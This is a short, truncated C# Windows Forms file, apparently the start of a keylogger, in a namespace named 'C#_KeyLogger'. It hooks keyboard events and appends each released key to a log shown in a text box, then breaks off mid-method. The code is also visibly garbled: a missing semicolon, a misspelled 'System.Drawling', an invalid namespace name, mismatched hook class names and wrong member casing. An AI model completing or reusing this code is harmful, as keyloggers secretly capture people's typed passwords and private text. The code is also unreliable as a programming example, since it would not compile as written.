using System
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawling;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using WikiReader;

namespace C#_KeyLogger
{
    public partial class Form1 : Form
    {
        BlakeOnDexHook hook;
        string log = string.Empty;
        
        public Form1()
        {
            InitializeComponent();
            hook= new BlakeOnDex();
            hook.KeyUp += (s, e) =>
                {
                    log += e.Keydata.ToString();
                    textBox1.Text = log;
    
               

